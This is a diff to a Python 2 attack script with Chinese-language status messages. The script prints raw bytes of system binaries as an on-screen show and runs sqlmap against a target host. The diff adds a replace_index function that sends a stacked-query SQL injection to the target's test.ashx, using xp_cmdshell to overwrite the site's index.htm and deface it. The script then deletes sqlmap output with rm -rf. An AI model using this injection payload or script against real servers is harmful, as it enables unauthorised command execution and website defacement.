@@ -170,10 +170,10 @@ def scan_port_os(host):
     crawl(host)
     center_print ("发现有sql注入漏洞，开始攻击")
     time.sleep(5)
-    cool_show()
+    cool_show("/bin/bash")
 
-def cool_show():
-    f = open("/bin/bash", 'rb')
+def cool_show(binary):
+    f = open(binary, 'rb')
     f.seek(0, 0)
     index = 0
     while True:
@@ -213,6 +213,20 @@ def attack(ipaddr,i):
         time.sleep(2)
         attack(ipaddr,i-1)
 
+def replace_index(host):
+    raw_url="http://"+host+"/"+"test.ashx?id="
+    url_data="1;exec ..xp_cmdshell 'copy C:\\inetpub\\wwwroot\\1.txt C:\\inetpub\\wwwroot\\index.htm'"
+    url=raw_url+urllib.quote(url_data)
+    center_print("开始替换网页")
+    cool_show("/bin/ls")
+    try:
+        res=urllib2.urlopen(url)
+        print res.read()
+        center_print (""+ Fore.GREEN + Style.BRIGHT+"替换网页成功")
+    except:
+        center_print ("" + Fore.RED + Style.BRIGHT+"替换网页失败")
+
+
 def res_out():
     center_print ("" + Fore.RED + Style.BRIGHT+Back.BLACK+"服务器被成功攻陷")
     center_print ("" + Fore.RED + Style.BRIGHT + Back.BLACK + "服务器被成功攻陷")
@@ -227,6 +241,7 @@ if __name__ == '__main__':
     attack(ipaddr,5)
     del_file(ipaddr)
     time.sleep(3)
+    replace_index(ipaddr)
     if(is_attack==0):
         os.system('sh ~/sqlmap')
         os.system('rm -rf ~/.sqlmap/output')
